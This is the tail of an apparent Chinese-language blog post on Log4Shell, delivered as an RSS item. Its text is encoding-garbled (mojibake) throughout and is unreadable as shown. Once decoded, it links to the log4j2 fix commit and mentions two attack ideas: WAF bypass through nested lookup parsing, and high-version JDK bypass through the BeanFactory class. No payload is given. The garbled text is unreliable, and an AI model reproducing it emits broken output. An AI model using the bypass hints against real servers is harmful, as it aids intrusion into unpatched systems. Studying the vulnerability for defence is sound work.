&lt;p&gt;å…·ä½“çš„ä¿®å¤åœ¨&lt;a href=&quot;https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658&quot;&gt;è¿™é‡Œ&lt;/a&gt;æ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹ä¸‹ï¼Œå› ä¸ºæµç¨‹åŸºæœ¬ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸åšå¤ç°äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./Log4Shell/image-20230928191702796.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å…³äºWAFåŸºæœ¬çš„æ€è·¯å°±æ˜¯åˆ©ç”¨log4jçš„è¿­ä»£è§£æè¿›è¡Œpocæ„é€ ï¼Œä¸è¿‡è²Œä¼¼ç°åœ¨å¤§å®¶éƒ½èƒ½é˜²ä½äº†ã€‚&lt;/p&gt;
&lt;p&gt;å…³äºé«˜ç‰ˆæœ¬JDKçš„ç»•è¿‡æ€è·¯ï¼Œå¯ä»¥é€šè¿‡ &lt;code&gt;org.apache.naming.factory.BeanFactory&lt;/code&gt; ç­‰ç±»è¿›è¡Œç»•è¿‡ã€‚&lt;/p&gt;
</content:encoded></item></channel></rss>